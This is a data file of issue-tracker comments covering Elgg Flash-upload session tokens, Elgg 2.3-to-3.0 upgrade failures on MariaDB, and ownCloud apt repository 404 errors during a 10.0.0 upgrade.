Elgg/Elgg/2553/11072198,"Original ticket  on 40779575-08-24 by trac user dannyl, assigned to unknown. Elgg version 1.7 Running 1.7.3 unmodified core engine. Scenario Using Flash to upload a file. The Flash movie posts a form to a php page to process the upload. The form contains session_id, session token in hidden fields in addition to the action token and ts that were generated using input/token view.  The post action uses $_REQUEST to extract the hidden fields like this session_id($_REQUEST['session_id']); $_SESSION['__elgg_session'] = $_REQUEST['st']; if (!validate_action_token()) {     die('Could not upload the file - Error# 6701'); } It is impossible to use the built in Elgg validate_token / generate_token functions to validate the action token  since setting session_id initializes all session variables and appears to be a logout action. ",False,True,False,Elgg/Elgg/2553
Elgg/Elgg/2553/13660159,trac user dannyl wrote on 40779579-06-01 This is contrary to the documentation that suggests that the tokens can be used to authenticate other applications like Flash. Does not seem to be correct. From our perspective - passing the session id and session token in hidden fields without validating the action token is a huge security hole. Danny ,False,True,False,Elgg/Elgg/2553
Elgg/Elgg/2553/13660160,cash wrote on 40779661-06-27 What documentation are you referring to? ,False,True,False,Elgg/Elgg/2553
Elgg/Elgg/2553/13660161,"trac user dannyl wrote on 40786887-07-15 Replying to cash  Sometimes, you need to send use the security tokens ""outside"" PHP code. For example, you may need to inject security tokens into rich interfaces (Flash, JavaScript,...). In this case, you can use the following code $elgg_ts = time(); $elgg_token = generate_action_token($__elgg_ts); ",False,True,False,Elgg/Elgg/2553
Elgg/Elgg/2553/13660162,trac user dannyl wrote on 40786982-02-15 I implemented two parametric versions of generate_token and validate_token I'm attaching the code below - ,False,True,False,Elgg/Elgg/2553
Elgg/Elgg/2553/13660163,Attachment added by trac user dannyl on 40786983-07-09 security_tokens_by_parameter.php ,False,True,False,Elgg/Elgg/2553
Elgg/Elgg/2553/13660165,"cash wrote on 40822665-06-26 As a follow-up to this, I was able to upload a file using Flash by simply including the Elgg session cookie in the data submitted by Flash. No changes required to core. ",False,True,False,Elgg/Elgg/2553
Elgg/Elgg/2553/13660166,"trac user dannyl wrote on 40823277-04-07 Cash Could you be so kind as to share the PHP code you used to ""include the Elgg session cookie in the data ""? My bad - for not doing this the right way, but I was unable to use php set session since it reinitializes the session variables Danny ",False,True,False,Elgg/Elgg/2553
Elgg/Elgg/2553/13660167,"cash wrote on 40823741-03-10 I know nothing about Flash and was using a 3rd party flash package for uploading files. It provided JavaScript for setting variables in the Flash object. I had the JavaScript set the Elgg cookie identifier in the Flash object so that it is passed as POST data. When that was done, PHP initialized the session with the same identifier as the browser session. In summary, I passed the cookie from Flash back to PHP by embedding the cookie in the web page. I'm closing this ticket since there does not appear to be anything lacking in Elgg's implementation. I still get new comments on the topic. ",False,True,False,Elgg/Elgg/2553
Elgg/Elgg/2553/13660168,"trac user dannyl wrote on 40836015-10-28 Did you actually succeed in sharing Elgg session variables, previously set with the other unauthenticated session? I doubt it. I assume you are using php session_id to set the current session id. You are correct when you say that PHP initializes the session with the same id as the browser session - which means that none of the Elgg $_SESSION variables are available - which means that the Elgg token generation and verification functions do not work in this scenario.   Which is why I wrote my own parametrized functions. In other words this is still a defect imho Best regards Danny ",False,True,False,Elgg/Elgg/2553
Elgg/Elgg/2553/13660169,"cash wrote on 40836433-06-13 unauthenticated session? Elgg does not store anything of value in an unauthenticated session and that session is destroyed when the user logs in. If you meant authenticated session, yes I did. No, I'm not calling session_id(). If you do that after the session has been started, you destroy the session. I pass the session id as 'Elgg' in the form. If session.use_only_cookies is off, PHP will use that when starting the session. The only way to use session_id() is to call it before the session library runs its init function which I think happens on the boot event. Elgg does not load plugins until after the boot event. You have 2 options pass the session id as I've done or pass enough information to log in the user/catch the action token failure. The action handler needs some better logic for handling token failures but that is a different issue(#2602). Please do not reopen this again. ",False,True,False,Elgg/Elgg/2553
Elgg/Elgg/2553/13660170,"trac user dannyl wrote on 40836502-10-25 I think I understand what you're saying but, if session.use_only_cookies is off - a security vulnerability is created. We've taken the latter tack - passing enough information to validate/invalidate the token and it seems to work quite well.  I've uploaded the code.  No changes required in core. D ",False,True,False,Elgg/Elgg/2553
Elgg/Elgg/2553/13660171,cash wrote on 40836673-05-13 Elgg regenerates the session when a user logs in to prevent session fixation. Setting session.use_only_cookies adds another layer of protection against this but it is not Elgg's primary defense (especially as it is outside of the application's control). ,False,True,False,Elgg/Elgg/2553
Elgg/Elgg/2553/13660172,trac user dannyl wrote on 40836702-08-13 I know that. I think we've beaten this one to death. session.use_only_cookies is a php.ini parameter which I would be wary of changing since it might spill over into other PHP apps the Web server handles. I'm happy with our solution. Be happy to publish the sample code on the wiki if you think there is value. If not we can walk away from this rat hole D ,False,True,False,Elgg/Elgg/2553
Elgg/Elgg/2553/13660173,"cash wrote on 40836717-12-02 If you keep on posting with this attitude, I can find better things to occupy my time on. ",False,True,False,Elgg/Elgg/2553
Elgg/Elgg/2553/13660174,trac user dannyl wrote on 40836820-10-23 Replying to cash Molto apologies - no attitude intended. Sometimes the fingers are faster than the mind. your time is greatly appreciated of course. What would the appropriate place to post an example on how to interface php code launched from other user agents inside the browser? Wiki ? or trac? D ,False,True,False,Elgg/Elgg/2553
Elgg/Elgg/2553/13660176,"cash wrote on 40836920-07-15 You were coming across as very condescending - whether intended or not. Thanks for clearing that up. Wiki is the best place. I created a link for this at the bottom of this page  should just have to log in, click the link, and you'll get an edit box for the new page. Thanks! ",False,True,False,Elgg/Elgg/2553
Elgg/Elgg/2553/13660177,"trac user dannyl wrote on 40837073-03-07 Replying to cash Thanks. Perish the thought. Will post to the wiki page you setup.  I just took a look at our plugin code that does Flash file upload - unfortunately, at this point in time, not very portable, having dependencies on our theme plugin etc etc.... But the lessons I would hope are applicable to other people thinking about Flash upload as an alternative to the vanilla file input html control ",False,True,False,Elgg/Elgg/2553
Elgg/Elgg/12126/345173745,"When upgrading a test installation from beta3 to rc1 I got the pending profile field upgrade. Execution fails with the error Upgrade ""Migrate schema of profile fields"" failed Profile field 'description' could not be migrated An exception occurred while executing ' INSERT INTO elgg_annotations (entity_guid, , , value_type, owner_guid, access_id, time_created, enabled) SELECT entity_guid, ?, , value_type, owner_guid, access_id, time_created, enabled FROM elgg_metadata WHERE  = ? AND entity_guid IN ( SELECT guid FROM elgg_entities WHERE type = 'user' ) ' with params [""profiledescription"", ""description""] SQLSTATE[23000] Integrity constraint violation 1048 Column 'owner_guid' cannot be null ",False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/408501216,do you have the same trouble if going from 2.3 to rc1? ,False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/408829744,"Trying to upgrade 2.3 to rc1 is a total failure... I made a fresh install with 2.3.8 and then tried to upgrade it to rc1 directly. But I only get a WSOD and a critical error in error log telling me that ""Site secret is not set"". I don't see a way to continue testing with this error. Maybe one question should I have commented out the $CONFIG-&gt;dbencoding line in settings.php before running upgrade.php? Though I'm not sure if upgrade.php did anything at all. Anyway, how to deal with $CONFIG-&gt;dbencoding is not really clear to me as the upgrade docs don't even mention it while the comment in settings.php tells me I would have to convert tables to utf8mb4 manually - which is not explained anywhere either. ",False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/409967924,"So, I can install and use 2.3.8. I can also install and use 3.0-rc1. But I can't upgrade 2.3.8 to 3.0-rc1 without totally breaking the installation due to ""Site secret not found"" error. Could the error be connected with upgrade.php getting protected by default from non-logged-in access on 3.0? ",False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/409973230,"How are you upgrading? I mean if you can't access upgrade.php, you can't upgrade using the browser, unless you are logged in as an admin. I insist that everyone should use CLI tools to avoid these kind of issues. If you are using starter project, first update all the dependency values, in composer.php, then run  and you are done and there is no hassle. ",False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/409995590,I did try elgg-cli tools and got the same error. There's no error about upgrade.php not being accessible. The upgrade process seems to start at least until the fatal error occurs. I can't say at which point during the upgrade the error occurs though. I only see the result of the site no longer working once the error has occured. I'm using the rc1 zip from the community site for testing. I completely replaced the content of the install folder and have settings.php and .htaccess replaced+updated accordingly. ,False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/409996169,"I am not going to bother with zips, sorry. I will try the workflow now with git and cli. ",False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/410003895,Worked like a charm. Upgrade output ,False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/410004923,Try adding  to  and see what's in the logs. ,False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/410031247,"So I now wasted 1 hour trying to get the test site upgraded with composer using the starter-project to 3.0. And it doesn't work - at least not for the time being. Then I wasted another 45 minutes getting the 3.0-rc1 branch with git to my dev-server - which is still running on php 5.6 so I can't use it for testing - and then to my old notebook that don't has git running where I tried to upgrade the test installation from 2.3.8 to 3.0-rc1. With elgg-cli [PDOException]   SQLSTATE[42000] Syntax error or access violation 1072 Key column 'site_guid' doesn't exist in table Am I to fucking run this as root!? So as root I still get [PDOException]   SQLSTATE[42S22] Column not found 1054 Unknown column 'site_guid' in 'field list' And as a last straw again tried it again via browser and got again Thu Aug 02 203757.299457 2018] [php7notice] [pid 2453] [client 192.168.0.1051590] [2018-08-02 203757] ELGG.CRITICAL Exception at time 1533235077\nRuntimeException The site secret is not set. in /xxx/engine/classes/Elgg/BootService.php104\nStack trace\n#0 /xxx/engine/classes/Elgg/Application/BootHandler.php(100) Elgg\BootService-&gt;boot(Object(Elgg\Di\ServiceProvider))\n#1 /xxx/engine/classes/Elgg/Application/BootHandler.php(48) Elgg\Application\BootHandler-&gt;bootServices()\n#2 /xxx/engine/classes/Elgg/Application.php(218) Elgg\Application\BootHandler-&gt;__invoke()\n#3 /xxx/engine/classes/Elgg/Application.php(461) Elgg\Application-&gt;bootCore()\n#4 /xxx/engine/classes/Elgg/Application.php(362) Elgg\Application-&gt;run()\n#5 /xxx/engine/classes/Elgg/Application.php(418) Elgg\Applicationroute(Object(Elgg\Http\Request))\n#6 /xxx/index.php(8) Elgg\Applicationindex()\n#7 {main}\n {""exception""""[object] (RuntimeException(code 0) The site secret is not set. at /xxx/engine/classes/Elgg/BootService.php104)""} {""backtrace""[],""process_id""2453,""memory_peak_usage""""2 MB"",""memory_usage""""2 MB"",""url""""/~daniel/elggcomposer/"",""ip""""192.168.0.10"",""http_method""""GET"",""server""""yyy.nil"",""referrer""null}\n [Thu Aug 02 203757.300982 2018] [php7notice] [pid 2453] [client 192.168.0.1051590] [2018-08-02 203757] ELGG.NOTICE failsafe/messages/exceptions/exception view does not exist.  {""process_id""2453,""memory_peak_usage""""2 MB"",""memory_usage""""2 MB"",""url""""/~daniel/elggcomposer/"",""ip""""192.168.0.10"",""http_method""""GET"",""server""""yyy.nil"",""referrer""null}\n [Thu Aug 02 203757.341221 2018] [php7notice] [pid 2453] [client 192.168.0.1051590] [2018-08-02 203757] ELGG.NOTICE failsafe/page/default view does not exist.  {""process_id""2453,""memory_peak_usage""""2 MB"",""memory_usage""""2 MB"",""url""""/~daniel/elggcomposer/"",""ip""""192.168.0.10"",""http_method""""GET"",""server""""yyy.nil"",""referrer""null}\n ",False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/410157746,I am sorry to have spent hundreds of hours on building a better core without getting paid just to make your life miserable... ,False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/410158780,"Jerome and Jeroen have upgraded several production 2.0 sites and we have addressed all the issues. Starter project works so does cloning I am already working on several productions 3.0 sites. Maybe adjust your attitude and try figure out what's wrong with your set up, don't be like other 1000 newbies we have to deal on the community site. ",False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/410159755,Thanks for taking the time to test and provide feedback. It is always a bit of a guessing game what could cause your problems. We have been doing upgrade paths from different version and in different ways. It would be helpfull if you could try to stay with us for a few more tests. To get a few things clear  Are you using a regular LAMP installation? Which PHP / Mysql version Does your db account has rights to manage the database Do you have some aggresive OPcode caching installed? Are you upgrading with the Elgg caching options enabled? is  set in your config (settings.php) could you remove your cache folders before upgrading?  ,False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/410174041,"It's Opensuse Tumbleweed 32bit (yes, the notebook is that old...) Linux kernel 4.17.11 Apache 2.4.33 MariaDB 10.2.16 PHP 7.2.7 No OPCode caching, Memcache or Redis. I can install a 2.3.8 site without issues. I can also install a fresh 3.0-rc1 site without issues. It's just the 2.x -&gt; 3.x upgrade that fails. The dbuser has full permissions for the one database used for the site but not more. On my first upgrade attempt I had disabled site caching on Elgg 2.3.8 before starting the upgrade. In all further attempts I left it enabled as it seemed indifferent to have it enabled or disabled regarding the error showing up during the upgrade. I have no cache symlink created. Inside the data directory a ""caches"" folder gets created before the fatal error during the upgrade stops the upgrade. I used the settings.example.php delivered with 3.0-rc1 as template for settings.php. I added db credentials as always and also added dataroot and wwwroot info additionally. I tried it with dbencoding set and with dbencoding commented out in settings.php. I'm not sure what you mean with site_secret set in settings.php. Would I have to set it? I did not and I also see no such line in it. I don't remember if I tried it with removing the cache folders completely, but I can try again. Sorry if I sounded annoyed about usage of composer - and actually I never tried cloning directly from git before. It's just that I never got into using composer for installing / upgrading an Elgg site because it just takes me much longer this way as with using the zip as I have done for year. It's just a workflow I got used to. The problem I had with the starter-project was that 2.x requires PHP 5.6 and when trying to upgrade to dev-master it failed because Elgg3 requires PHP &gt;=7.0. I got that fixed by editing composer.json. Next problem was that I couldn't figure out how to get over the minimum-stability requirement which composer sees not fulfilled with dev-master. I couldn't get this fixed so I emptied the install folder and tried it with creating a fresh project. But a completely fresh composer install of dev-master also failed because one dependency (forgot to remember which one) required a file of unknown (or invalid) type. How to use elgg-cli is more than a bit unclear to me. Do I have to be root due to file permissions issues alone (data directory)? And would also db access be needed for this user or is the dbuser from settings.php used? My mysql access is secured by password and the mysql admin user is not the default mysql root user so you get db access either with the user credentials from settings.php or no access at all. ",False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/410179629,"this could be a problem, we encountered this with a client. MySQL (the Elgg requirement) isn't the same as MariaDB. Up to a certain point they were, but then thing changed. It can be very minor, like the way queries are parsed, but there is a difference. that's why there is a 2.x branch in the starter-project. All Elgg zips are build using the starter-project The starter-project is set to  which allows to install everything.  see  root, but maybe the same user as the apache user, to avoid file permission conflicts. the  is used (if the site is up and running), otherwise you can only use  which creates the  file ================================================= We tried to update a client database just before beta.3 and it worked i believe mostly. maybe a bit slow and any issues we found we fixed before rc.1 but we haven't retried an upgrade. Please keep in mind, on all PRs travis does a upgrade from 2.3 to the PR codebase and than all the unit/integration tests. So everything should work ;) but nothing is perfect and that's why we fix stuff ",False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/410193953,"All major Linux distrubutions (e.g. RH7, CentOS 7, latest SuSE) have replaced MySQL with MariaDB already. So, it would be a pity if Elgg lost compatibility with MariaDB with Elgg3. I don't know if I can manage to replace MariaDB with MySQL to test if this makes a difference in the 2-&gt;3 upgrade. I need to find out if there are still MySQL packages available that I could install to replace MariaDB. But maybe it's not an incompatibility between MariaDB and MySQL as such that causes the error. Could it be that some specific (new) settings in my.cnf are necessary for Elgg3 (innodb) that I might not have in my my.cnf yet? Maybe caching related? Would it be an option to add MariaDB to the Travis tests to see if the tests including the upgrade test would work with it? I know that MariaDB and MySQL are slightly drifting apart (as it seems especially with 10.2 of MariaDB). But the question is if this already affects ""normal"" queries to such an extend as I would think (maybe wrongly) that Elgg wouldn't use overly specific queries. I had used the 2.x branch at the starter-project to make the initial install. The problem is that it sets the php requirement to 5.6 exactly. And this seems to block upgrading to dev-master (~3.0) where php 7.0 is required at minimum. And about the minimum-stability... what can I say? I just didn't get it working. But that's maybe off-topic here. ",False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/410195763,"Just to be clear, Elgg can't loose compatibility as it was never officially supported ;) We had the MariaDB issue with a client on 2.3. and it wasn't so much Elgg core but a plugin. We couldn't figure out what was wrong as everything worked fine on our development PCs but it just wouldn't work on the clients server. After much debugging we found the issue in a SQL query. after a bit of rewriting we got it working on both MySQL and MariaDB. ",False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/410196664,Just remembered that we upgraded the client (on a test environment) to 3.0 with MariaDB. so it can work. ,False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/410198483," using MariaDB for years. And I haven't noticed any issues at all once I made one small adjustment in my.cnf. The only trouble I had was with delayed queries (logrotate was crashing the log table, logging in was also crashing the log table). But with max_delayed_threads = 0 in my.cnf I could fix this (I think the delayed queries even got removed now in Elgg 2.3 or 3.0, right?). Other than that I had to make sure that the archive engine support is enabled (again for the log table) which got disabled by default on updating MariaDB from 5 -&gt; 10. ",False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/410248328,"Thanks for doing the Travis upgrade test with MariaDB. So, it looks like it's something specific to my test environment causing the error. Unfortunately, I'm at a loss about about what it could be. I've tried the git install approach, also seeded the database, and used elgg-cli for upgrading. The error output I got was php vendor/elgg/elgg/elgg-cli upgrade async -vvv [PDOException (42S22)]   SQLSTATE[42S22] Column not found 1054 Unknown column 'site_guid' in 'field list' Exception trace  () at /xxx/vendor/robmorgan/phinx/src/Phinx/Db/Adapter/PdoAdapter.php349  PDO-&gt;query() at /xxx/vendor/robmorgan/phinx/src/Phinx/Db/Adapter/PdoAdapter.php349  Phinx\Db\Adapter\PdoAdapter-&gt;query() at /xxx/vendor/robmorgan/phinx/src/Phinx/Db/Adapter/PdoAdapter.php357  Phinx\Db\Adapter\PdoAdapter-&gt;fetchRow() at /xxx/vendor/robmorgan/phinx/src/Phinx/Db/Adapter/AdapterWrapper.php191  Phinx\Db\Adapter\AdapterWrapper-&gt;fetchRow() at /xxx/vendor/robmorgan/phinx/src/Phinx/Migration/AbstractMigration.php208  Phinx\Migration\AbstractMigration-&gt;fetchRow() at /xxx/vendor/elgg/elgg/engine/schema/migrations/20170728010000_remove_site_guid.php36  RemoveSiteGuid-&gt;validate() at /xxx/vendor/elgg/elgg/engine/schema/migrations/20170728010000_remove_site_guid.php50  RemoveSiteGuid-&gt;up() at /xxx/vendor/robmorgan/phinx/src/Phinx/Migration/Manager/Environment.php125  Phinx\Migration\Manager\Environment-&gt;executeMigration() at /xxx/vendor/robmorgan/phinx/src/Phinx/Migration/Manager.php366  Phinx\Migration\Manager-&gt;executeMigration() at /xxx/vendor/robmorgan/phinx/src/Phinx/Migration/Manager.php342  Phinx\Migration\Manager-&gt;migrate() at /xxx/vendor/robmorgan/phinx/src/Phinx/Console/Command/Migrate.php113  Phinx\Console\Command\Migrate-&gt;execute() at /xxx/vendor/symfony/console/Command/Command.php264  Symfony\Component\Console\Command\Command-&gt;run() at /xxx/vendor/symfony/console/Application.php874  Symfony\Component\Console\Application-&gt;doRunCommand() at /xxx/vendor/symfony/console/Application.php228  Symfony\Component\Console\Application-&gt;doRun() at /xxx/vendor/robmorgan/phinx/src/Phinx/Console/PhinxApplication.php83  Phinx\Console\PhinxApplication-&gt;doRun() at /xxx/vendor/robmorgan/phinx/src/Phinx/Wrapper/TextWrapper.php238  Phinx\Wrapper\TextWrapper-&gt;executeRun() at /xxx/vendor/robmorgan/phinx/src/Phinx/Wrapper/TextWrapper.php128  Phinx\Wrapper\TextWrapper-&gt;getMigrate() at /xxx/vendor/elgg/elgg/engine/classes/Elgg/Application.php612  Elgg\Applicationmigrate() at /xxx/vendor/elgg/elgg/engine/classes/Elgg/Cli/UpgradeCommand.php40  Elgg\Cli\UpgradeCommand-&gt;execute() at /xxx/vendor/symfony/console/Command/Command.php264  Symfony\Component\Console\Command\Command-&gt;run() at /xxx/vendor/symfony/console/Application.php874  Symfony\Component\Console\Application-&gt;doRunCommand() at /xxx/vendor/symfony/console/Application.php228  Symfony\Component\Console\Application-&gt;doRun() at /xxx/vendor/symfony/console/Application.php130  Symfony\Component\Console\Application-&gt;run() at /xxx/vendor/elgg/elgg/engine/classes/Elgg/Cli.php110  Elgg\Cli-&gt;run() at /xxx/vendor/elgg/elgg/elgg-cli54 As it seems the site_guid column in the access_collections and api_users tables got removed (api_users table is empty) but then the removal in the config table wasn't done anymore. I don't think there's much sense for the time being to try again without at least an idea of what I might have to change in the test environment. I just have reached my frustration limit for now. I had hoped for a smooth start for upgrading my plugins to 3.0 but without being able to test them properly I guess I have to put that on hold for now, too. Sorry, if that sounds reproachful. It's not meant that way at all. ",False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/410330782,We can create a vagrant box for you ,False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/410458288,"Thanks for the offer with the vagrant box. For now I think I don't need it. I've set up a virtualbox instance with a LAMP stack to have a test environment for Elgg 3 apart from my half-broken 32 bit notebook. It's a bit a hassle to get things from host system to guest system but maybe I figure out how to configure that this is possible. I also think I found out how to fix the upgrade issue(s) I came across (not sure if they are stricly MariaDB related or if these are related to my server config / MariaDB config / security settings - as the travis test seemed to have worked without issues with MariaDB). Database table upgrade issues in vendor/elgg/elgg/engine/schema/migrations/20170728010000_remove_site_guid.php  On 2.x the site_guid column in the config table is a primary key. Removal of site_guid as primary key with  fails for me. After these lines the site_guid is still a primary key and therefore the attempt to remove the site_guid column fails. So, the PDO error message that comes out with elgg-cli about an unknown column seems rather misleading. I got it working with  A similar issue occurs for the removal of the site_guid column in the users_apisessions table. Here site_guid is not a primary key. But in this table is the UNIQUE KEY  (,) defined. And again the removal of the site_guid column fails because it's still included in the unique key. So, in this case I added the lines  before the  line. These two changes made the upgrade from 2.3.8 to 3.0.0-rc.1 finish without issues. But then there's one additional issue in the asyn upgrades, namely in vendor/elgg/elgg/engine/classes/Elgg/Upgrades/AlterDatabaseToMultiByteCharset.php in line 149 This fails with the error message from the database server I guess this might be because the dbuser used for the Elgg site has only (full) privileges for the Elgg database but not more. I don't think that this is so uncommon, so I wonder if it makes sense trying to set this option within the upgrade script at all. As innodb_large_prefix variable is 'ON' anyway on my database server I just tried with this line commented out and it seemed to have worked, i.e. all the async upgrades also finished without issues. If the changes in the site_guid upgrade script I used are not complete nonsense, would it be possible to add them? As with the ""set global"" issue I don't know if there's any solution possible without the need to ask the user to alter the server config if the problem is indeed a matter of permissions. ",False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/411318528,"I am not a fan of replacing OO queries with literal equivalents, because ultimately we will want to be able to run Elgg with any of the SQL drivers supported by the PDO (sqlite in particular for integration testing). I am not sure exactly why you are experiencing issues with those queries, but maybe it would make sense to raise an issue with Phinx guys ( However, at this stage I am not going to oppose your changes, if they pass the tests on Travis. We can look into SQL-agnosticity in the future - there is plenty that needs to be changed. Just voicing my opinion here about the query roadmap. Re large prefixes There is already an issue there  think what we should do is  Check the prefix value Attempt to change it - catch DB exception and fail the Upgrade with a notice that the admin has to manually alter the value in .cnf  I didn't have issues with innodb prefixes to start with on my installation. It was something added by @friend , so maybe he can comment more on why it is needed. ",False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/411318726,"One other approach we could try is inject our (Doctrine's PDO driver) into Phinx, instead of using their adapters. ",False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/411540751,"I knew you wouldn't like the replacement and I also think it would be much nicer without. I came across a stackoverflow question where someone had the same problem with primary key removal. But it wasn't mentioned if it's MariaDB related or happened with MySQL Maybe it's server setting (some kind of ""strict"" mode) that blocks the removal with the original code and it would work with changing something in my.cnf. Recent PR in Phinx of today  This might help with the primary key issue in the config table, if the key would first get removed with this new Phinx function. I don't know if an equivalent functions would already be available in Phinx for modiying the unique key in the users_apisessions table before column deletion. ",False,True,False,Elgg/Elgg/12126
Elgg/Elgg/12126/434064103,"@friend and @friend any feedback with regards to the changes I made to get the upgrade working? Could they be implemented in some way? I'm not sure the issues are strictly MariaDB only, especially the SET GLOBAL problem could also occur with any DB server install without global permissions. If innodb_large_prefix would be ""ON"" anyway it wouldn't be necessary to set it. Though in this case it might be necessary to check this early during the upgrade process (which is beyond my skills whereas I could make a PR for the rest). ",False,True,False,Elgg/Elgg/12126
core/owncloud/27775/225272860,"♠ Thanks for reporting issues back to ownCloud! This is the issue tracker of ownCloud, if you have any support question please check out  is the bug tracker for the Server component. Find other components at  reporting potential security issues please see  make it possible for us to help you please fill out below information carefully. Before reporting any issues please make sure that you're using the latest available version for your major branch (e.g. 9.0.x), see  to reproduce 1. 2. 3. Expected behaviour Tell us what should happen Actual behaviour Tell us what happens instead Server configuration Operating system Web server Database PHP version ownCloud version (see ownCloud admin page) Updated from an older ownCloud or fresh install Where did you install ownCloud from Signing status (ownCloud 9.0 and above) The content of config/config.php List of activated apps Are you using external storage, if yes which one local/smb/sftp/... Are you using encryption yes/no Are you using an external user-backend, if yes which one LDAP/ActiveDirectory/Webdav/... LDAP configuration (delete this part if not used) Client configuration Browser Operating system Logs Web server error log ownCloud log (data/owncloud.log) Browser log ",False,True,False,core/owncloud/27775
core/owncloud/27775/298183252,"Sorry, I tried to do this from a mobile device, and can't figure out how to complete the necessary data. I'll fill in details in a few hours. ",False,True,False,core/owncloud/27775
core/owncloud/27775/298196122,Updated with relevant information. ,False,True,False,core/owncloud/27775
core/owncloud/27775/298224918,Issue also applies to 9.1.5 otherwise same setup. ,False,True,False,core/owncloud/27775
core/owncloud/27775/298316145,"I think in oC term it is ""stable"" but not ""production"" ",False,True,False,core/owncloud/27775
core/owncloud/27775/298319906,"@friend this is madness. An end-user adding a PPA dubbed ""stable"" doesn't expect software that isn't production-ready to hit his instance. Not to mention, I don't recall any such explanation of terminology being available when I included this PPA in my sources list. If this is the direction OC wants to go, then there should be a (very) visible explanation on the ""Packages"" tab under ""Download"". Moreover, under ""Repos Stable or Major Release?"" in the documentation there should really be a clarification that ""stable"" isn't ""production-ready"", instead of ",False,True,False,core/owncloud/27775
core/owncloud/27775/298382803,@friend I think you should keep this open for now until one of the repo maintainer is having a look at this. If you e.g. browse on  see that there is 9.1.5 available and not 10.0.0. Not quite sure if the repo index needs to be refreshed or similar ,False,True,False,core/owncloud/27775
core/owncloud/27775/298633953,"FYI, this is happening with the Debian repository too. ",False,True,False,core/owncloud/27775
core/owncloud/27775/298635797,"@friend this bug isn't about the 404 error when upgrading using the ""stable"" repo; my understanding of how GitHub works is lacking, so I'll appreciate comments on how to proceed. ",False,True,False,core/owncloud/27775
core/owncloud/27775/298636265,@friend Just keep this open and some one with the knowledge about the repositories might have a look at it ,False,True,False,core/owncloud/27775
core/owncloud/27775/298660133,Just leave the issue open until a repo maintainer fix the issue. ToR ,False,True,False,core/owncloud/27775
core/owncloud/27775/299155120,"Is there any ETA, when this can be fixed? ",False,True,False,core/owncloud/27775
core/owncloud/27775/299415319,Side-note If your system is not a testing system wait for 10.0.1 or 10.0.2 before upgrading. Until then the repositories are probably fixed as well. ,False,True,False,core/owncloud/27775
core/owncloud/27775/301097846,Stable contains 9.1.x series until issues on 10.0 are sorted.. I cannot reproduce the problem you are seeing. ,False,True,False,core/owncloud/27775
core/owncloud/27775/301100108,"@friend I can confirm that it does now, so I guess this issue is solved. However, it used to suggest the upgrade to 10.0 for , then fail with a 404; this was definitely an issue for multiple people (see ",False,True,False,core/owncloud/27775
core/owncloud/27775/301100575,"@friend yes, this issue has also been fixed. wont happen again when 10.0 shows up properly in upcoming releases. closing. ",False,True,False,core/owncloud/27775
core/owncloud/27775/301107137,"Same issue here ""sudo apt-get update"" and ""sudo apt-get upgrade"" gives me Reading package lists... Done Building dependency tree Reading state information... Done Calculating upgrade... Done The following packages will be upgraded   owncloud owncloud-deps-php7.0 owncloud-files 3 upgraded, 0 newly installed, 0 to remove and 0 not upgraded. Need to get 27.8 MB of archives. After this operation, 15.6 MB of additional disk space will be used. Do you want to continue? [Y/n] y Err1   owncloud 10.0.0-1.1   404  Not Found [IP 2a014f8130934f3 80] Err2   owncloud-files 10.0.0-1.1   404  Not Found [IP 2a014f8130934f3 80] Err3   owncloud-deps-php7.0 10.0.0-1.1   404  Not Found [IP 2a014f8130934f3 80] E Failed to fetch   404  Not Found [IP 2a014f8130934f3 80] E Failed to fetch   404  Not Found [IP 2a014f8130934f3 80] E Failed to fetch   404  Not Found [IP 2a014f8130934f3 80] E Unable to fetch some archives, maybe run apt-get update or try with --fix-missing? ",False,True,False,core/owncloud/27775
core/owncloud/27775/301108577,did you clean the apt cache first ? stable does not have 10.0.0 packages at all. ,False,True,False,core/owncloud/27775
core/owncloud/27775/301109546,Using  gives the very same output ,False,True,False,core/owncloud/27775
core/owncloud/27775/301121562,"I've been having, as already stated, the exact same problem for a month so far. Cleaning the partial apt directory won't fix it (nor won't fix it the clean apt command). Francesco Menghetti ",False,True,False,core/owncloud/27775
core/owncloud/27775/301122022,I forgot to say that this very same issue happens on Debian stable. Since other users are reporting it on Ubuntu too (same repo?) I believe it is a repository issue. ,False,True,False,core/owncloud/27775
core/owncloud/27775/301135430,I'm also still hitting this on both Ubuntu 14.04 and 16.04.  doesn't help. ,False,True,False,core/owncloud/27775
core/owncloud/27775/301207633,Same here - still having this even after apt clean ,False,True,False,core/owncloud/27775
core/owncloud/27775/301237527,"It still get a problem for Ubuntu 14.04, Err   owncloud 10.0.0-1.1   404  Not Found [IP 144.76.105.220 80] Err   owncloud-files 10.0.0-1.1   404  Not Found [IP 144.76.105.220 80] Err   owncloud-deps-php5 10.0.0-1.1   404  Not Found [IP 144.76.105.220 80] E Failed to fetch   404  Not Found [IP 144.76.105.220 80] E Failed to fetch   404  Not Found [IP 144.76.105.220 80] E Failed to fetch   404  Not Found [IP 144.76.105.220 80] E Unable to fetch some archives, maybe run apt-get update or try with --fix-missing? sudo apt list --installed owncloud  gives owncloud/now 9.1.5-1.1 all [installed,upgradable to 10.0.0-1.1] ",False,True,False,core/owncloud/27775
core/owncloud/27775/301239630,Same problem for me too. I've tried apt-get clean &amp; apt-get autoclean and their apt versions. None seems to clear things out so it pull down v9 latest. This is on Ubuntu Server 16.04 ,False,True,False,core/owncloud/27775
